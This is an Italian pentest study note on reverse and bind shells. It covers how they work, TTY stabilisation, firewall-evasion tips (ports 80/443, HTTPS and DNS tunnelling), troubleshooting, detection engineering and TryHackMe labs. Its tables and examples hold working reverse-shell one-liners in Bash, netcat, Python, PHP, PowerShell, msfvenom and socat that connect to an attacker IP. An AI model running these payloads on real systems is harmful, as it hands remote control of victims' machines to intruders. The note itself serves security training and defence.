---
tipo: concetto
tag: [metodologia]
fase: 2
fonti: 6
aggiornato: 2026-07-02
stato: maturo
aliases: ["Reverse Shell e Bind Shell"]

---

# Reverse Shell e Bind Shell

## In breve

Una **shell remota** permette di eseguire comandi su un sistema target attraverso la rete. Esistono due varianti: nella **reverse shell** è il *target* a connettersi all'attaccante; nella **bind shell** è l'*attaccante* a connettersi al target. Entrambe le tecniche si usano nella fase di [[Exploitation]] per ottenere accesso interattivo dopo aver sfruttato una vulnerabilità.

## Come funziona

### Reverse Shell

```
[Target] ──connessione uscente──> [Attaccante:4444]
```

Il target esegue del codice (payload) che apre una connessione verso la macchina dell'attaccante su una porta in ascolto. Vantaggi: spesso aggira i firewall del target che bloccano connessioni *entranti* ma permettono quelle *uscenti*.

**Passi:**
1. L'attaccante mette [[netcat]] in ascolto: `nc -lvnp 4444`
2. Il target esegue il payload (es. via RCE, upload di webshell)
3. Si stabilisce una connessione: l'attaccante riceve la shell

### Bind Shell

```
[Target] ──porta aperta 4444──> [Attaccante si connette]
```

Il target apre una porta e mette una shell in ascolto. L'attaccante si connette a quella porta. Meno comune perché i firewall spesso bloccano porte non standard in entrata sul target.

### Tipi di reverse shell per linguaggio

| Linguaggio | Payload |
|---|---|
| Bash | `bash -i >& /dev/tcp/10.10.10.1/4444 0>&1` |
| Python | `python3 -c 'import socket,subprocess,os; ...'` |
| PHP | `php -r '$sock=fsockopen("10.10.10.1",4444); ...'` |
| PowerShell | `powershell -nop -c "$client = New-Object Net.Sockets.TCPClient(...)"` |

## Esempio pratico

```bash
# --- ATTACCANTE: mette netcat in ascolto ---
nc -lvnp 4444

# --- TARGET (Linux): reverse shell in bash ---
bash -i >& /dev/tcp/10.10.14.1/4444 0>&1

# --- TARGET (Linux): reverse shell con netcat (se supporta -e) ---
nc -e /bin/bash 10.10.14.1 4444

# --- Stabilizzare la shell grezza ricevuta ---
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Poi: Ctrl+Z
stty raw -echo; fg
# Infine nel terminale: reset
export TERM=xterm
```

## Note

> Usare reverse shell e bind shell solo su sistemi autorizzati: lab, CTF, o pentest con contratto firmato. Su sistemi reali non autorizzati è un reato.

- Le shell grezze (`nc`) non hanno autocompletamento né history. Usare il trucco `pty.spawn` per renderle interattive.
- Sito di riferimento per generare payload pronti all'uso: <https://revshells.com> — seleziona OS, linguaggio e inserisci IP/porta.
- [[Metasploit]] genera automaticamente payload con `msfvenom` e gestisce sessioni multi-shell con `multi/handler`.
- Se [[netcat]] non supporta `-e`, usare la variante **mkfifo**: `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.1 4444 >/tmp/f`

## Mitigazione e difesa

- Bloccare connessioni uscenti non autorizzate con un firewall egress (in uscita).
- Monitorare processi figli anomali di servizi web (es. `apache` che lancia `bash`).
- Usare application whitelisting per limitare l'esecuzione di binari non autorizzati.

---

## MECCANISMO INTERNO
Una shell remota collega **stdin/stdout/stderr** di un interprete di comandi a un **socket TCP** (raramente UDP/ICMP/DNS). La differenza reverse vs bind è solo *chi inizia la connessione* (chi fa `connect()` vs chi fa `listen()`):
- **Reverse**: il target fa `connect()` verso `attaccante:porta`. Buca i firewall perché quasi tutte le reti permettono traffico **in uscita** (specie 443/80). Sull'attaccante serve un listener e una porta raggiungibile (no NAT che blocca).
- **Bind**: il target fa `listen()` su una porta; l'attaccante fa `connect()`. Richiede che una porta in **entrata** sul target sia raggiungibile → spesso bloccata da firewall ingress e NAT. Si usa quando le connessioni in uscita dal target sono filtrate ma una porta in entrata è aperta.

Nel payload bash `bash -i >& /dev/tcp/IP/PORT 0>&1`: `-i` shell interattiva; `/dev/tcp/IP/PORT` è una feature **della bash** (non un file reale) che apre un socket; `>&` redirige stdout+stderr nel socket; `0>&1` redirige stdin dallo stesso socket. Risultato: i comandi arrivano dal socket e l'output ci torna.

## TABELLA PAYLOAD per linguaggio/contesto — quando usare cosa
| Contesto / OS | Payload | Quando |
|---|---|---|
| **Linux, bash presente** | `bash -i >& /dev/tcp/10.10.14.1/4444 0>&1` | default Linux; serve bash (non sh/dash) |
| **Linux, solo `/bin/sh`** | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.14.1 4444 >/tmp/f` | quando `/dev/tcp` non c'è (dash) e nc è senza `-e` |
| **nc con `-e`** | `nc -e /bin/bash 10.10.14.1 4444` | rapido; ma `-e` assente nelle build moderne (OpenBSD nc) |
| **Python** | `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.1",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'` | affidabile, già **PTY-spawned** (semi-stabile) |
| **PHP (web RCE)** | `php -r '$s=fsockopen("10.10.14.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` | webshell PHP, `system()`/`exec()` disponibile |
| **PowerShell (Windows)** | `powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('10.10.14.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535\|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){...}"` | Windows senza binari aggiuntivi; spesso bloccato da AMSI/Defender |
| **msfvenom (binario)** | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=.. LPORT=.. -f exe -o s.exe` | quando puoi caricare ed eseguire un file; dà Meterpreter |
| **socat (TTY pieno)** | target: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.1:4444` | shell **completamente** interattiva se socat è sul target |

> [!tip] Generatore: [revshells.com](https://revshells.com) — scegli OS/lingua e inserisci IP/porta. Utile ma capisci *cosa* genera prima di incollarlo.

## STABILIZZAZIONE TTY (la procedura completa)
Una shell `nc` grezza non ha PTY: niente tab-completion, niente history, `Ctrl+C` la uccide, niente `sudo`/`ssh`/editor `vim`. Procedura canonica:
```bash
# 1. Ottieni un PTY (in ordine di disponibilità)
python3 -c 'import pty;pty.spawn("/bin/bash")'   # o python, o:
script /dev/null -c bash                          # fallback se python manca
# 2. Metti in background la shell remota
Ctrl+Z
# 3. (sul TUO terminale) passa il terminale in raw e riprendi
stty raw -echo; fg
# (la riga sembra vuota: premi Invio)
# 4. (nella shell remota) imposta tipo terminale e dimensioni
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 38 columns 116      # ricava i valori con `stty -a` nel TUO terminale
```
Perché `stty raw -echo`: disattiva l'elaborazione locale dei tasti (Ctrl+C, eco) sul tuo terminale, così vengono inoltrati al PTY remoto. Senza `TERM`, `clear`/`vim`/`less` falliscono con "terminal not fully functional".

> [!warning] Se esci dimenticando di ripristinare il terminale
> Dopo aver usato `stty raw -echo`, se la shell muore il tuo terminale locale resta "rotto" (niente eco). Digita alla cieca `reset` + Invio per ripristinarlo.

## SHELL ATTRAVERSO FIREWALL / PROXY
- **Egress filtrato salvo 80/443**: usa quelle porte (`LPORT=443`). Spesso passa anche se è traffico non-HTTP, perché molti firewall filtrano solo per porta.
- **Solo proxy HTTP in uscita**: tunnella con `socat`/`chisel` via `CONNECT`, oppure usa payload HTTP/HTTPS (`reverse_https` di Meterpreter, che si mimetizza in TLS).
- **DPI che ispeziona TLS**: `reverse_https` con certificato e dominio plausibile, o C2 over DNS (`dnscat2`, `iodine`) quando solo il DNS esce.
- **NAT lato attaccante** (sei dietro router): fai port-forward della porta del listener, o usa una redirect su VPS pubblico.

## TROUBLESHOOTING "non si connette" (5 errori + causa)
1. **Listener attivo ma nessuna connessione** → IP/porta sbagliati nel payload, o **egress firewall** sul target blocca la porta. Causa: porta esotica filtrata. Fix: prova `443`/`80`.
2. **`/dev/tcp: No such file`** → la shell è `dash`/`sh`, non bash. Fix: usa il payload `mkfifo` o invoca esplicitamente `bash -c`.
3. **`nc -e: invalid option`** → nc OpenBSD non ha `-e`. Fix: variante `mkfifo`.
4. **Connessione che si apre e cade subito** → payload va in background e il processo padre muore, oppure errore di sintassi nel one-liner. Fix: verifica le quote/escaping (specie in URL-encoding dentro una webshell).
5. **Shell ricevuta ma `Ctrl+C` la uccide / niente `sudo`** → manca il PTY. Fix: stabilizzazione TTY (sopra).

## DETECTION ENGINEERING
- **Anomalia parent-child**: un processo server web/db che genera una shell. Es. `apache2`/`nginx`/`php-fpm` → `sh`/`bash`/`nc`, oppure `w3wp.exe`/`sqlservr.exe` → `cmd.exe`/`powershell.exe`. È il segnale #1.
- **Socket sospetti**: processo `bash`/`python` con una connessione TCP in uscita verso un IP esterno su porta alta — incrociare con EDR (`/proc/<pid>/fd` che punta a un socket).
- **Sysmon (Windows)**: Event ID 1 (process create — catena anomala), 3 (network connection da processo inatteso). Linux: auditd `execve` di `nc`/`socat`, `bash` con redirect a `/dev/tcp`.
- **MITRE ATT&CK**: `T1059` Command and Scripting Interpreter (`.001` PowerShell, `.004` Unix Shell), `T1071` Application Layer Protocol (C2), `T1572` Protocol Tunneling, `T1095` Non-Application Layer Protocol.

## DOMANDE DA COLLOQUIO
1. **Reverse vs bind: quando l'una e quando l'altra?** Reverse quando l'egress è permesso ma l'ingress no (caso comune con NAT/firewall): è il target a connettersi fuori. Bind quando l'egress è bloccato ma una porta in entrata sul target è raggiungibile.
2. **Perché stabilizzare una shell e cosa fa `stty raw -echo`?** Una shell `nc` non ha PTY → no job control, no tab/history, `Ctrl+C` la chiude, no `sudo`/`ssh`. Si ottiene un PTY (`python pty.spawn`) e si mette il **terminale locale** in raw mode con `stty raw -echo` per inoltrare i tasti grezzi (Ctrl+C compreso) al PTY remoto.
3. **Cosa significa `bash -i >& /dev/tcp/IP/PORT 0>&1`?** `-i` interattiva; `/dev/tcp/...` apre un socket (feature bash); `>&` redirige stdout+stderr al socket; `0>&1` aggancia stdin allo stesso socket.
4. **Quale singolo indicatore tradisce quasi sempre una reverse shell sul target?** Una relazione padre-figlio anomala: un processo server (web/db) che lancia un interprete di shell con una connessione di rete in uscita.

## Lab

- **[[TryHackMe]] — "What the Shell" (introtoshells)**: room dedicata che fa praticare reverse vs bind shell, listener con [[netcat]], payload per vari linguaggi e la stabilizzazione TTY passo passo.
- **[[TryHackMe]] — "Vulnversity" e "Blue"**: applica una reverse shell reale — nella prima via upload su un web server, nella seconda via Meterpreter di [[Metasploit]].
- **revshells.com + un tuo lab locale**: genera diversi payload (bash, python, PHP, PowerShell) e verifica quale funziona a seconda della shell disponibile sul target (bash vs dash, nc con/senza `-e`), esercitando anche la procedura `stty raw -echo`.

## Collegamenti

- [[Exploitation]]
- [[Post-Exploitation]]
- [[netcat]]
- [[Metasploit]]
- [[Metodologia del Pentest]]
- [[MITRE ATT&CK]]

## Fonti

- PayloadsAllTheThings — Reverse Shell Cheatsheet: <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md>
- HackTricks — Full TTYs / Shell stabilization: <https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys>
- HackTricks — Shells: <https://book.hacktricks.xyz/generic-methodologies-and-resources/shells>
- revshells.com — Reverse Shell Generator: <https://www.revshells.com/>
- MITRE ATT&CK — Command and Scripting Interpreter (T1059): <https://attack.mitre.org/techniques/T1059/>
- TryHackMe — What the Shell: <https://tryhackme.com/room/introtoshells>
